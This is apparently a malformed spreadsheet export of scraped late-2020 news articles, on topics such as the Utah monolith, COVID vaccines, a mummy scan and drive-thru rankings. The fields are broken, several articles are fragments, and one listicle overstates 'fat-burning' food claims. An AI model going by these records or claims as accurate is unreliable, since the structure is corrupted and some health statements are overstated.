",#NAME?,1/12/2020 18:26,https://www.ctvnews.ca/sci-tech/mysterious-silver-monolith-disappears-from-utah-desert-1.5209169,"A tall, silver, shining metal monolith discovered in the desert in southeastern Utah -- which prompted theories of alien placement and drew determined hikers to its secret location -- has now disappeared, the state's Bureau of Land Management said Saturday.

The monolith was removed by an ""unknown party"" sometime Friday night, the agency said in a Facebook post.

""We have received credible reports that the illegally installed structure, referred to as the 'monolith,' has been removed"" from BLM public lands, the post said.

""The BLM did not remove the structure, which is considered private property.""

'WE'VE GOT TO GO LOOK AT IT!'

The monolith was first discovered November 18 by officers from the Utah Department of Public Safety's Aero Bureau.

They were flying by helicopter, helping the Division of Wildlife Resources count bighorn sheep in southeastern Utah, when they spotted something that seemed right out of ""2001: A Space Odyssey.""

""One of the biologists ... spotted it, and we just happened to fly directly over the top of it,"" pilot Bret Hutchings told CNN affiliate KSL. ""He was like, 'Whoa, whoa, whoa, turn around, turn around!' And I was like, 'What.' And he's like, 'There's this thing back there -- we've got to go look at it!'""

And there it was -- in the middle of the red rock was a shiny, silver metal monolith sticking out of the ground. Hutchings guessed it was ""between 10 and 12 feet high."" It didn't look like it was randomly dropped to the ground, he told KSL, but rather it looked like it had been planted.

""I'm assuming it's some new wave artist or something or, you know, somebody that was a big (""2001: A Space Odyssey"") fan,"" he said, referencing a scene in the 1968 film where a black monolith appears.

Still, it is illegal to install structures or art without authorization on public lands ""no matter what planet you're from,"" said Utah DPS in a statement released Monday.

WHERE IS IT?

The location of the monolith was not disclosed because authorities said they didn't want curiosity seekers to become stranded in the remote landscape and need to be rescued.

But of course, that didn't stop some. Several people already successfully located the monolith, tucked in a redrock slot canyon south of Moab.

The trek involved driving in the darkness over rocky terrain and verifying GPS coordinates, according to three people who went to see it. At least one explorer got lost at first. But the trip was worth it, they said, even if the monolith wasn't the work of aliens.

David Surber may have been among the very first to view the monolith in person. The coordinates to the monolith were circulating on Reddit, but none of the users could confirm they were correct. Surber volunteered to find out.

The coordinates were indeed correct, and Surber eagerly shared the results of his visit with 200 Reddit users who'd flooded his inbox. Among his findings: The monolith wasn't magnetic or solid (he said it sounded ""like a cardboard box"" when he knocked on it). He also shared step-by-step instructions for the drive out to the monolith.

""At the end of the day, extraterrestrial or made through artistic expression; the monolith provided an opportunity for thousands of people to rally behind something positive again,"" he told CNN in an email. ""It was a good escape from all the negativity we've experienced in 2020.""",Mysterious silver monolith disappears from Utah desert,

X-Ray Scans of Ancient Egyptian Mummy Reveal a
Surprising Discovery

",29/11/2020 9:25,https://www.sciencealert.com/x-ray-of-a-mummified-child-from-ancient-egypt-reveals-surprise-finding,"An Egyptian mummy that was decorated with a woman's portrait contained a surprise – the body of a child who was only 5 years old when she died.

Now, scientists have learned more about the mysterious girl and her burial, thanks to high-resolution scans and X-ray ""microbeams"" that targeted very small regions in the intact artifact.

Computed X-ray tomography (CT) scans of the mummy's teeth and femur confirmed the girl's age, though they showed no signs of trauma in her bones that could suggest the cause of her death.

Targeted, high-intensity X-rays also revealed a mysterious object that had been placed on the child's abdomen, scientists reported in a new study.

Scans performed on the mummy about two decades ago were low contrast, and many details were hard to see. For the new analysis, researchers conducted new CT scans to visualize the mummy's structure in its entirety.

They then focused on specific regions using X-ray diffraction, in which a tightly concentrated beam of X-rays bounces off the atoms in crystalline structures; variations in the diffraction patterns reveal what type of material the object is made of.

This is the first time that X-ray diffraction has been used on an intact mummy, said lead study author Stuart Stock, a research professor of cell and developmental biology in the Feinberg School of Medicine at Northwestern University in Chicago.

The mummy, known as ""Hawara Portrait Mummy No. 4,"" is in the collection of Northwestern University's Block Museum of Art. It was excavated between 1910 and 1911 from the ancient Egyptian site of Hawara, and it dates to around the first century A.D., when Egypt was under Roman rule.

""During the Roman era in Egypt, they started making mummies with portraits attached to the front surface,"" Stock told Live Science.

""Many thousands were made, but most of the portraits have been removed from the mummies we have – maybe only 100 to 150 still have the portrait attached to the mummy,"" he said.

Though the portrait on Mummy No. 4 showed an adult woman, the small size of the mummy hinted otherwise – and the scans confirmed that the mummy was a child, still so young that none of her permanent teeth had emerged.

Her body measured 37 inches (937 millimeters) from the top of her skull to the soles of her feet, and the wrappings added another 2 inches (50 mm), according to the study.

The researchers also detected 36 needle-like structures in the case – 11 around the head and neck, 20 near the feet and five by the torso. X-ray diffraction determined that these were modern metal wires or pins that may have been added to stabilize the artifact sometime during the last century.

One surprising find was an irregular layer of sediment in the mummy's wrappings, perhaps mud that had been used by the attending priests to secure the mummy's bandages, Stock suggested.

Another puzzling discovery was a small, elliptical object about 0.3 inches (7 mm) long, which the researchers found in the mummy's wrappings over the abdomen, dubbing the object ""Inclusion F.""

(Stuart R. Stock)

X-ray diffraction showed that it was made of calcite – but what was it? One possibility is that it could be an amulet included because the child's body was damaged during mummification, Stock said.

After such a mishap, priests would often place an amulet such as a scarab over the damaged body part to protect the person in the afterlife, and the newfound calcite ""blob"" was about the right size and in the right position for it to be a protective scarab, Stock explained.

However, the resolution of the CT scan wasn't high enough to show carved details in the object, so it's impossible to say for sure what it could be, he added.

""Every time you go into a study like this, you get good answers. But then you just raise more questions,"" Stock said.

The findings were published online Nov. 25 in the Journal of the Royal Society Interface.

Scientists at the University of Maryland have found that the leaves...
",25/11/2020 16:14,https://www.yahoo.com/lifestyle/one-herb-block-fat-study-042017575.html,"We all know that washing down a Burger King Triple Whopper with a Diet Coke does nothing to erase the fat and calories your fast-food indulgence is packing. But what if washing it down with a nice cup of stinging nettle tea could actually neutralize the fat bomb's fat-packing effects? A recent study published in the scientific journal Nutrients appears to suggest that may be the case. And as you'll see, it actually makes a good bit of sense.

Stinging nettle is a springtime flowering plant that grows abundantly all around the world, including in the U.S. Its extract is used in various dietary supplements, although there's little evidence to suggest the extract has any real benefits. The leaves, however, which are known to be rich in a number of nutrients, including vitamins, minerals, amino acids, and carotenoids, can be used as a safe and effective diuretic, as well as to support milk production in nursing women. Now, a group of scientists out of the University of Maryland has demonstrated that those leaves could end up becoming a powerful tool in the fight against diet-induced obesity. (Related: 21 Best Healthy Cooking Hacks of All Time.)

Based on their own prior research, which showed that stinging nettle extract could improve blood sugar metabolism in mice, the scientists, led by Dr. Diane N. Obanda, had reason to believe that feeding mice the leaves from the stinging nettle plant might actually prevent the mice from gaining weight—even while being fed a high-fat diet.

To test their theory, Dr. Obanda's team divided 36 male mice into four cohorts:

The first group of 9 was fed a low-fat diet for 12 weeks

The second group of 9 was fed a high-fat diet for 12 weeks

The third group of 9 was fed a high-fat diet that also included stinging nettle for 12 weeks

The fourth group of 9 was fed a high-fat diet for six weeks, and then for the six weeks after that had stinging nettle added to their diet.

As expected, the low-fat diet resulted in significantly less weight gain and body fat accumulation than the high-fat diet. But, the addition of stinging nettle in the third group resulted in significantly less weight gain and body fat accumulation. In the fourth group, the weight gain and body fat accumulation slowed significantly after stinging nettle was incorporated into the diet.

Dr. Obanda and her team were, therefore, able to conclude that stinging nettle, when consumed as an herb (as opposed to an extract), has a positive effect on metabolism (although they were not able to say precisely why; that will have to wait for further research). And because of the similarities between mice and humans in terms of anatomy, physiology, and genetics, there is reason to hope these results will carry over to human subjects. However, that too will require additional research.

3,"""The type of vaccine it is may lead to better long-term immunity."" ","POPSCI.COM

Why AstraZeneca’s COVID vaccine is an important
addition to the fleet of offerings
",25/11/2020 11:42,https://www.popsci.com/story/health/astrazeneca-oxford-covid-vaccine/,"For the third Monday in a row, Americans have woken up to positive news about the race to develop an effective and safe COVID-19 vaccine. This time, a third vaccine candidate joined the ranks of those with promising Phase II/III trials. Made by AstraZeneca, and first developed by researchers at Oxford University, this vaccine candidate differs in approach from those already premiered by Pfizer and Moderna. The drug company announced today that its vaccine, as of now, has an average 70 percent efficacy rate over two trials with different protocols. That’s less than both the two other candidates. However, it could still have certain advantages compared to the other two current front runners.

The type of vaccine it is may lead to better long-term immunity, says Monica Gandhi, a professor of medicine at the University of California, San Francisco. The AstraZeneca vaccine relies on a modified and weakened version of a virus that infects chimpanzees to deliver a small amount of SARS-CoV-2 genetic material to those vaccinated—effectively teaching the body’s own immune response to recognize and attack the new pathogen.

The other two vaccines that have announced positive results from Phase II/III trials, produced by Moderna and Pfizer, both rely on a new method to develop a vaccine. Known as modified RNA (mRNA) vaccines, these treatments are a new class of vaccine that uses modified messenger RNA to instruct the body’s own cells to make viral proteins it can then recognize.

Both the Pfizer and Moderna vaccines “showed incredibly high efficacy in diverse populations around the world,” says Gandhi. Results from both showed about 95 percent efficacy in trial populations.

By contrast, the efficacy rate of the AstraZeneca vaccine currently appears to be highly dose-dependent and to sit at what the company is calling an average 70 percent efficacy rate, which basically means how well a drug works in controlled trials, but not necessarily how it will work in the real world. Until the drug maker releases more information, there’s no way to know exactly how effective it is, especially when it gets used in conditions outside regimented clinical trials, or how much more effective it might become with more trials and research.

The 70 percent rate comes from two trial protocols with different dosing regimens. The first gave a half dose of the vaccine first followed by a full dose of the preventative drug at least a month later. This protocol resulted in a 90 percent effectiveness rate. The second regimen gave two full doses exactly a month apart, which provided a 62 percent effectiveness rate. “Putting those two trial results together, they come up with this 70 percent efficacy [average],” Gandhi says. But until the company releases more information, there’s no way to know exactly what’s going on beneath that statistic, she says. And scientists are still investigating why one protocol was more effective than the other, and what that will mean for future treatments.

But there’s no evidence yet about how long the immunity that mRNA vaccines impart will last. “The advantage of putting it in a viral vector [which AstraZeneca is doing] is that it can cause more enduring and varied immune responses,” Gandhi says.

Another possible advantage of the AstraZeneca vaccine is that it would be much less expensive to produce and distribute, says Gandhi. Unlike the Pfizer and Moderna vaccines, the new vaccine can be stored at a normal refrigerator temperature for up to six months. Both Pfizer and Moderna require much colder conditions and shorter timelines that aren’t as easy to accomplish.

Although the three vaccines differ in approach, they all target the same coronavirus spike protein, which sits on the outside of the SARS-CoV-2 virus and allows it to enter human cells and infect them. And they all have persuasive evidence that they don’t produce negative short-term side effects. “It’s just more and more proof that priming the immune system with the spike protein is leading to immune responses that, if there’s any disease at all, leads to mild disease,” Gandhi says.

AstraZeneca says it could produce three million doses of the vaccine in 2021 if it is approved. Pfizer and Moderna also have roll-out plans for their vaccines. But there are significant questions about how vaccine distribution would work, especially how they would be stored.

“Of course I am thrilled to see any advancement of a vaccine,” says Sue Anne Bell, a University of Michigan nursing professor and disaster response effort. But huge coordination on international, national, and local levels will be required to actually immunize the population. In the United States, she says, “the kind of immunization campaign that we’re thinking about, we haven’t seen in quite some time.”",Why AstraZeneca’s COVID vaccine is an important addition to the fleet of offerings,

1 Acorn Squash

Besides serving up a third of the day's fiber, a 1-cup serving of this highly nutritious, naturally sweet veggie contains 30% of your daily vitamin C needs. Here's why Squash Is a Fall Superfood You Need to Add to Your Grocery List ASAP.

2 Apples

This fruit provides one of the best and easiest-to-get sources of fiber. A recent study at Wake Forest Baptist Medical Center found that for every 10-gram increase in soluble fiber eaten per day, belly fat was reduced by 3.7% over 5 years. And a study at the University of Western Australia found that the Pink Lady variety had the highest level of antioxidant flavonoids—a fat-burning compound—of any apple. Here are 25 Delicious Apple Recipes you can try!

3 Bananas

This fruit that comes in its own wrapper boosts bloat-fighting bacteria in your stomach and is a prime source of potassium, which can help diminish water retention. Each medium banana contains about 36 grams of good carbs: Their low glycemic index means carbs are slowly released into your body, preventing sugar crashes and spurring muscle recovery. Once you buy bananas, here's a Simple Trick That Keeps Bananas Fresh.

4 Barley

Barley is a terrific appetite suppressant because it contains 6 grams of belly-filling, mostly soluble fiber that has been linked to lowered cholesterol, decreased blood sugars, and increased satiety. It also has tons of health benefits like decreased inflammation and stabilized blood sugar levels.

5 Black Beans

Beans are a great source of protein that includes fiber, which means they keep your blood sugar from spiking and provide the building blocks of muscle growth. One cup of black beans has 12 grams of protein and 9 grams of fiber; they're also rich in folate, a B vitamin that stokes muscle growth, and copper, which strengthens tendons. On top of that, a Spanish study showed that consuming four weekly servings of beans or legumes accelerates weight loss. Plus, did you know black beans are The #1 Best Carb To Eat If You're Trying to Lose Weight?

6 Legumes

Lentils, chickpeas, peas, and beans—they're all magic bullets for belly-fat loss. In a study by the American Diabetes Association, it's been proven that legumes aid weight loss more effectively than an equivalent diet that doesn't include them. Those who consumed the legume-rich diet also saw improvements in their ""bad"" LDL cholesterol levels and systolic blood pressure. Get started with one of these 29 Healthy Chickpea Recipes That Can Help You Lose Weight.

7 Quinoa

Quinoa is higher in protein than any other grain, and it packs a hefty dose of heart-healthy, unsaturated fats, and B vitamins. Try quinoa in the morning. It has twice the protein of most cereals and fewer carbs.

8 Sweet Potatoes

Sweet potatoes can be called the king of slow carbs because they're digested slowly and keep you feeling fuller and energized longer, plus they are loaded with fiber, nutrients and can help you burn fat. The magic ingredients here are carotenoids, antioxidants that stabilize blood sugar levels and lower insulin resistance, which prevents calories from being converted into fat. And their high vitamin profile (including A, C, and B6) gives you more energy to burn at the gym. So get started with one of these 25 Healthy and Delicious Sweet Potato Recipes.6254a4d1642c605c54bf1cab17d50f1e

9 Tart Cherries

In most of the country, you'll find them dried, frozen, or canned. But they're worth seeking out because they are a true superpower fruit. Animal studies at the University of Michigan have found that tart cherries have the power to reduce belly fat and alter the expression of fat genes.

10 Whole-Wheat Bread

You know brown is better, but do you know why? It's because whole wheat contains three parts of the grain, all nutrient-rich and full of fiber. Just be careful—most bread in the bread aisle is filled with high-fructose corn syrup or a blend of whole and enriched wheat. It's worth splurging on the pricier stuff, often found in the freezer section.

11 Whole-Wheat Pasta

As with whole-wheat bread, you're getting all three parts of the grain, with fiber to increase satiety and prevent overeating. For variety, try pasta made from lentils, chickpeas, black beans, or quinoa; all are full of fiber.

12 Yogurt

Packed with protein and probiotics, a cup of yogurt will satisfy hunger and improve your gut health, a key factor in weight loss. It is also rich in vitamin D and calcium, and it's one of the few foods containing conjugated linoleic acid, a special fat that studies show may reduce body fat. But you need to get the right kind to take advantage of these benefits. Most yogurts are full of sugar and fruity sweeteners.

ESTERO, Fla. — The day they met, Richard Wilbanks and Gunner were inseparable.

Gunner, a Cavalier King Charles spaniel, snuggled up right next to Richard that first meeting at the breeder’s place in Miami, and that was all the two needed.

Richard took Gunner home to his wife, Louise, in Estero and the now-famous duo are always side by side whether it’s on the couch or out on the lanai that overlooks a wild nature preserve.

The companionship was put to the ultimate test one Sunday morning in late October as Richard and Gunner went out for a walk by the pond just next to the Wilbanks’ home.

The pair were walking along the shoreline where, unseen to either Richard or Gunner, an alligator was on alert.

In an instant, the almost 4-foot gator lunged from the water and grabbed Gunner. Without any hesitation, Richard lept into the water after the puppy and the gator that had it in its jaws.

The rescue: Florida man saves his dog from the jaws of an alligator; wildlife cam films the dramatic rescue

“It was like a missile,” Richard said recalling the incident. “We were only about 3 feet away from it, but it struck like a snake. It had Gunner in a vise grip and I just rushed in.”

Richard and Louise moved to Estero four years ago.

The couple came by way of central Texas hill country, Louise said. Richard’s son Grant is a landscape architect living in Bonita Springs, so the Wilbanks were familiar with the area and wanted to be close to family.

The pair came to see the house in Estero, but it was under a contract, Richard said. The two went back to Texas and were on their honeymoon when the Realtor called to let them know the house was back on the market. They didn’t hesitate.

“We fell in love with it,” Richard said.

Tucked at the dead-end of their neighborhood, the Wilbanks’ home speaks to their love of nature.

Paintings of seahorses and roseate spoonbills hang in the family room where one of Gunner’s beds lays out in front of the TV. A cross-stitched heron and a large painting of two great egrets watch over the dining table.

Louise said Richard spent four years growing plants in the backyard so the view into the nature preserve was uninterrupted.

Richard said he’s seen deer, turkey, bobcats and even a panther near their home.

“It’s wonderful to be able to share our lives with the wildlife,” he said.

And that positivity even goes for the alligator who grabbed Gunner, too.

“He’s still swimming out there,” Richard said.

Gunner's recovery

Immediately following the attack, Gunner was in shock. Once Richard was able to pry Gunner free, the gator clamped down on his hands and he then had to free himself. The pair traipsed back to the house, both dripping blood.

After a quick home fix on Richard’s hands, Gunner went to the animal hospital where doctors found a puncture wound. The Wilbanks were worried about any internal injuries, but X-rays showed only some water in the lungs. The puppy stayed at the hospital for a few days to recover.

Gunner is just right as rain now, greeting visitors at the door with an energy only puppies can muster, and he has a new leash for his walks.

“A new leash on life,” Richard said.

Gunner and Richard’s harrowing attempt was captured on video because the Florida Wildlife Federation and the fstop Foundation put up cameras to track wildlife in the area.

“I’m pleased with the job they do,” Richard said of FWF. “And this lets people know we can live with wildlife.”

Meredith Budd, the FWF representative in Southwest Florida, said the Wilbanks’ street was very receptive to the cameras.

Overall, 17 cameras across 15 properties are placed in backyards in Estero in what the two organizations call Sharing the Landscape.

“Humans and wildlife, we both inherently share the same landscape and homeowners who live in and around nature should understand the value of wildlife around them,” Budd said. “While this video was shocking and I’m glad everyone was OK, I’m glad it’s a learning opportunity for the importance of respecting wildlife and taking precautions to make sure this doesn’t happen to anyone else.”

The federation checks the cameras, periodically, Budd said, and this was the first time an incident like this showed up.

The cameras only hold a certain number of photos and videos before the memory cards fill up, and they run on batteries, so it’s a bit labor intensive to keep up with them all. Budd said she’d love to get solar power and cloud storage for the cameras, but the funding isn’t there.

Even so, the cameras show the dynamic between people enjoying nature in their backyards and wildlife doing the same.

“It’s interesting seeing the timestamps to see when people are out there, and we are sharing that landscape — just usually not at the same time,” Budd said.

In Southwest Florida, there are wild animals sharing the same spaces humans use, and Budd said it’s important to know what precautions are needed to mitigate risk or conflict.

Richard said for him and Gunner, this was a happy ending story.

His advice: Make sure to leash your dog and keep them 10 feet away from the water.

When it comes to pork, the terms and parts can be confusing. Where does that pork butt actually come from? (Hint: it's not the rear — it's actually from right behind the head, via Serious Eats). What is bacon, really? And what's the difference between every cut labeled ""chop""?

It comes down to this: every pork cut comes from one of four main areas: shoulder, belly or side, leg, and loin (via Cook's Illustrated) — and every cut can go by a few different names. But to simplify, shoulder cuts, like pork butt or pork shoulder, are good for slow cooking, like barbecue or roasting. Leg cuts are where we get ham: ham shank, spiral-cut ham, country ham — which you can pull off making yourself. Bacon, that fatty, crispy, gift from the pig gods, is from the belly or side. So are ""spare ribs"" and, duh, pork belly, which is more or less a term for fattier, uncured bacon that had spiked in popularity with foodie-types but apparently lost traction during the pandemic (via Salon and Bloomberg).

Loin cuts are the leanest and maybe the most varied. Many prefer them for their tenderness, and a lot of the ""chop"" varieties we see in the store come from the loin: blade chop, rip chop, center-cut chop. Many ""roast"" and ""rib"" varieties are also from the loin — like the pork loin roast or baby back ribs — yes, the very same, before you spontaneously break out into song. But not just any chop will do.",This Is The Worst Cut Of Pork You Can Buy,

In Just 3 Words, Elon Musk Explained How You Can Be
Expert at Anything (Even Rocket Science)

",5/11/2020 12:09,https://www.inc.com/minda-zetlin/elon-musk-spacex-rockets-expert-expertise-books-reading-jim-cantrell.html,"You can become an expert in just about anything if you read enough books on the subject. If you don't believe me, ask Elon Musk. Whenever anyone asks him how he learned to build space-traveling rockets, this is his three-word answer: ""I read books.""

Musk is no rocket scientist, at least not by training. He has a bachelor's degree in economics and another one in physics, and although he got into Stanford's PhD program in energy physics/material science, he dropped out after two days to launch Zip2, a city guide software company that the founders sold to Compaq for $307 million. A few years later he co-founded the company that would become PayPal, which eBay bought for $1.5 billion.

It was at this point, flush with internet millions, that Musk began setting his sights on colonizing Mars. He attempted to buy rockets from the Russians, but they demanded a price even an internet millionaire couldn't afford, and generally refused to take him seriously, according to a profile in Esquire. So Musk told aerospace consultant Jim Cantrell who was working with him that they would build the rockets themselves.

He showed Cantrell his plans, and Cantrell thought, ""I'll be damned -- that's why he's been borrowing all my books."" Musk had been ingesting Cantrell's textbooks on rocket-building and had transformed himself into an expert. ""He knew everything,"" Cantrell told Esquire. ""He'd been planning to build a rocket all along."" And that's how SpaceX was born.

It works even if you're not Elon Musk.

""All right,"" you might argue, ""Musk learned to build rockets by reading books. But he's a genius. Ordinary mortals can't do this."" But they can, at least they with can houses, if not rockets. I know, because my father-in-law, an otherwise unremarkable man who spent most of his adult life working for the Postal Service, did just that.

I never met him; he died a few years before my husband, Bill, and I got together. But Bill remembers how his father (also named Bill) rebuilt the family home piece by piece over the years, reconfiguring it as needed. He brought in fill and raised and leveled the yard. He built on new rooms and added a wheelchair ramp for his granddaughter. When he wasn't rebuilding his own house, he was helping the neighbors renovate theirs. He could have had a successful contracting business if he'd been willing to give up the steady paycheck of a civil servant. Bill senior never took a course -- he just read books about whatever he wanted to do, and then he went and did it.

Want to read your way to success yourself? Begin with a growth mindset -- the belief that your abilities are not fixed in stone but can change over time, and that you can expand and change them if you're willing to put in the effort. It works for Musk: Someone with a bachelor's degree in economics and physics who believes he can learn to build his own rockets has a growth mindset, and then some. Next, if you can, do what Musk did when he hooked up with Cantrell. Find one or more mentors who can advise you and help guide your learning. At the very least, your mentor can help you figure out which books to read to build greater expertise more quickly.

And finally, put that expertise to the test. Dan Coyle, who's written several bestselling books about what makes some individuals, and some teams, more successful than others, recommends spending 30 percent of your time learning and 70 percent testing your newfound knowledge. So, to cement your expertise, test your own knowledge, preferably by trying things out in the real world.","In Just 3 Words, Elon Musk Explained How You Can Become Expert at Anything (Even Rocket Science)",

Formerly known as Grimes, the 32-year-old singer (whose government name is Claire Boucher) just revealed in a new interview that she now goes by “c.”

According to the New York Times, the partner of Elon Musk said her new name is a reference to the speed of light. C welcomed a baby boy, X Æ A-XII Musk, back in May. The nickname for her baby's complicated name is X.

During the new interview, c talked about her 5-month-old son’s unique interests. “I’ve watched ‘Apocalypse Now’ and stuff with my baby,” she said. “He’s into radical art. Like, he just actually is, and I don’t think it’s problematic to engage with them on that level.”

Not only is c introducing her son to media works that others may not deem suitable for a baby, she is creating new content as well for him. Her latest project was an attempt to move X away from traditional infant entertainment. Partnering with the app Endel, the musician created a ""soothing, ambient soundtrack"" in an effort to produce “a better baby sleeping situation.”

“When you have a baby, you’re always using white noise machines. It’s much easier to get them to sleep if you train them on some kind of audio situation,” she explained. “And so I was just like, could this be more artistic? In general, stuff for babies is really just creatively bad. I don’t want your first introduction to the world to just be all this aimless crap.”

The project that was released on Wednesday is titled “AI Lullaby,” and is available on the app for the next eight weeks.

“I’m not insulting babies,” she continued. “I’m just, it’s all very one vibe. I just feel like getting out of the like, ‘Here’s a zebra and a bear in, like, pastel color tones’ energy. That’s just one very small sort of creative lens that things can be looked at through.”

She added that babies “do have taste.""

",26/10/2020 7:44,https://ca.style.yahoo.com/dirtiest-thing-grocery-store-120030872.html,"Almost one full year into the COVID-19 pandemic, we've all become painstakingly familiar with the best safety protocols recommended by the CDC. From wearing masks to keeping socially distant and frequently washing our hands, the rules have become second nature. We also know a lot more about the virus and how it spreads than we did last spring—such as the risk of catching COVID from food products, food packaging, or grocery shopping bags is low, according to the CDC. Still, if you've yet to be vaccinated, now is not the time to let your guard down at the grocery store or any other public place. In fact, there are some basic hygiene tips you should follow from here on out to keep your chances of picking up unwanted viruses or bacteria extremely low.

For starters, know that one of the most bacteria-packed items in the grocery store is waiting for you the moment you enter the store: The shopping baskets.

The handles of these baskets are frequently touched by other shoppers—and what's more, they're held on to throughout the duration of a grocery shopping trip. So, unlike other oft-touched things—like credit card pads or self-checkout screens—grocery baskets have a higher potential of transferring bacteria from one handler to the next.

Why Grocery Store Baskets Can Be So Dirty

Experts say grocery store basket handles are much less likely to get the regular cleanings that they should—and even when they are disinfected, it's hard to do a thorough job.

""It's almost impossible to wipe off all the surfaces that people might touch,"" says Leann Poston M.D., M.B.A., M.Ed, a consultant for Invigor Medical. ""Baskets are stacked and then used. Even if the baskets were thoroughly cleaned, they might be contaminated when removed. Unlike shopping carts, it is tough to keep your shopping basket away from personal items and clothing.""

Gail Trauco R.N., BSN-OCN, patient advocate and CEO/founder of Medical Bill 911, agrees that cleaning baskets presents particular challenges.

Story continues

""The structure of the baskets—weave and ridged surfaces—create places for [germs] to hide during cleaning. Baskets are disinfected, however, it is impossible for a retailer to clean each crack and crevice,"" she says, pointing out that how baskets are handled also presents sanitary risks. ""You carry the basket on your arm, in your hand, or may change hands. Baskets are more likely to rub against clothing, counters, or product surfaces, spreading contamination.""

A Cleaner Shopping Option

Trauco urges grocery shoppers to skip the baskets and instead opt for a shopping cart (if available). Its handle is much easier to clean with antibacterial wipes—and many grocery stores have tasked associates to wipe them down after each use during the COVID-19 pandemic.

""Minimizing exposure to surfaces touched while shopping lowers your risk of exposure,"" says Trauco. ""Localize surface exposure to the shopping cart's handle, and place items in your cart without touching additional surfaces.""

Dr. Rashmi Byakodi, a wellness expert at Best for Nutrition, echoes these points, saying: ""It's better to use a cart as you can just sanitize the handle before use.""

Once you're done shopping and have checked out, make sure you return the shopping cart to a designated area for returned carts (if there is one). And then, immediately apply hand sanitizer to your hands—The CDC advises the use of hand sanitizer that contains at least 60% alcohol each time you touch a surface.

Even when the pandemic is over, keeping these tips in mind will keep you safe—and bacteria, viruses, and germs at bay—when you're at the store.

Lee Carter: Biden vs. Trump — at presidential debate both
men must say these 4 words to voters
",23/10/2020 9:38,https://www.foxnews.com/opinion/biden-trump-presidential-debate-voters-lee-carter,"NEW You can now listen to Fox News articles!

Thursday night is the last chance President Donald Trump and former Vice President Joe Biden have to make their case on the debate stage. And while the microphones can now be muted, there's one message they must still get across: with me, you will be safe.

Here's why those four words are so important and mean so much.

No matter where you sit on the political spectrum, you likely feel the same emotion right now: fear. And more than anything, we need to be reassured.

We need to know that it’s all going to be OK. That we can wake up after the election is decided, breathing a long-needed sigh of relief.

DOUG SCHOEN: BIDEN'S AHEAD IN POLLS — BUT SO WAS HILLARY CLINTON. CAN TRUMP STILL WIN?

And so, for both Trump and Biden, the message must be the same. But what it means coming for each of them will be totally different. Let's start with the president and then move on to the Democratic presidential nominee.

For Trump, he must convince us that as individuals we will be safe. We want a politician at the helm that will protect us from big, bureaucratic government. Give us the tools and let us make the decisions that are right for each of us and our families.

-Protect my money. I work hard for it. I don’t want to give it to the government and have them decide how to spend it. Keep my taxes as low as possible.

-Protect my freedom of speech. I want to be able to say what I want to post what I want and worship the way I want. I want to share my opinions free from judgment.

-Protect my right to bear arms. I’m scared of what might happen and I want the right to protect my home and family.

-Protect my community and city. I want a police force that can do their job.

-Protect my jobs. I know times are hard. I have heard politicians say that jobs aren’t coming back to the USA. Prove them wrong.

-Protect this economy. When you took office, everyone said the stock market would tank. The economy would be in shambles, and yet I feel better today than I did four years ago even with a pandemic. Keep this economy going. And whatever you do, don’t shut down the economy again. I couldn’t take it.

-Protect my vote. Mail-in ballots leave room for fraud. I believe the system could be rigged against me. Let’s vote the old-fashioned way to make sure that every vote that is counted is legitimate.

-Protect my dreams and my opportunity. I might be struggling now, but I want the American dream to be there. I want to be wealthy. I want unlimited opportunities and I don’t want to apologize for it.

For Biden, he must convince us that our institutions and our government will be safe.

We want a politician at the helm who restores a sense of order to the chaos. We want to trust that the system works for all of us and protects us when we need it. We want it to work for all Americans, not just a few.

-Protect us from COVID. Follow the science. Require masks. Do whatever it takes. We can’t fight COVID alone. This is exactly what a strong and healthy government is designed to do.

-Protect our health care system. From public health to my medical care, we have a right to health care.

-Protect us from greed. We are tired of putting profits before people on issues from climate change to basic regulation, let’s just do what’s right.

-Protect equality. It’s unfair that the wealthy get wealthier while everyone else struggles. Let’s create a tax structure that benefits those less fortunate and taxes those who can most afford it.

-Protect us from wrongs. From systemic racism to systemic inequality, we want all people treated fairly.

-Protect our image around the world. I used to be proud to be an American no matter where I went. Today, I am embarrassed. Please, restore our reputation overseas.

-Protect my vote. I believe voter interference is real. I worry about foreign interference in the election. I also worry about what’s happening here at home. I want to know that my vote will be counted.

-Protect our institutions. I want to trust the CDC. The Supreme Court. The FBI. National Security. Protect the office of the presidency itself. Protect us from the crazy. More than anything, I want to turn on the news and be bored. Restore order to the office.

One thing is clear, Americans everywhere are afraid. And with so many good reasons.

What is going to assuage our fears depends on the way we view the world.

A lot is at stake at the ballot box. And with just 12 days until Election Day, we need to know that whoever we vote for is going to make us feel safe again.

You’ll remember, for example, if a place forgets to add your side of fries; you might even curse them until your dying day. But you probably won’t remember much about a successful drive-thru pickup, because those are designed to be uneventful. Fast food places want you to focus on what counts: the meal. And now, with new data on all the elements that make a fast-food drive-thru experience great, QSR Magazine has the official ranking of the best ones in America as part of its larger Drive-Thru Study.

Market research firm Food Service Results analyzed the customer satisfaction ratings from 1,007 drive-thru users at 17 different major fast food chains across the United States. Some of the metrics are things you’ve probably been frustrated by at one time or another, like order accuracy and speed of service, but it goes deeper than that: have you given much thought to things like the cleanliness of a drive-thru lane, or the availability of various menu items? This new ranking takes all those considerations (and more) into account and averages them for an “Overall Experience” score. Chick-fil-A scored highest with 93 points, and ranked highest in every individual category except one: menu item availability. This is slightly surprising, since it seems like Chick-fil-A is already working off a more limited menu than the other chains and would thus be more likely to have everything in stock. (I mean, it’s mostly just chicken, right?)

The number-two drive-thru pick was a rather close second behind Chick-fil-A, and it is my great pleasure to reveal that it was Arby’s. Yes, we all use Arby’s as our pop cultural punching bag, but it actually outranked Chick-fil-A in menu item availability, and nearly matched it in the areas of speed of service and the quality of menu items. Culver’s, Panera, and Dunkin’ round out the top five.

The lowest ranking drive-thru on the list, whose metrics hover in the low 80s and high 70s, is Popeyes. Its speed, friendliness, and cleanliness were lowest rated, but both the quality and accuracy of the items ordered netted a high 85 ranking. I guess it’s hard to mess up orders when everyone just demands the beloved chicken sandwich 100% of the time.",And the best drive-thru in America is...,

Who will get the vaccine first? Here's where you might land
in line.

",19/10/2020 8:15,https://www.nationalgeographic.com/science/article/who-is-first-in-line-coronavirus-vaccine,"Whenever a new vaccine gets approved, health officials have to tackle the difficult question of who should be first in line to receive it. Typically health-care workers are first, and in previous outbreaks, such as the H1N1 swine flu in 2009, people whose health was most vulnerable got priority, too.

With the widely anticipated COVID-19 vaccine, there’s a new factor being considered: fairness.

On October 2, the National Academy of Medicine revealed its recommendations for COVID-19 vaccine distribution in an influential 237-page framework commissioned by the National Institutes of Health and the U.S. Centers for Disease Control and Prevention.

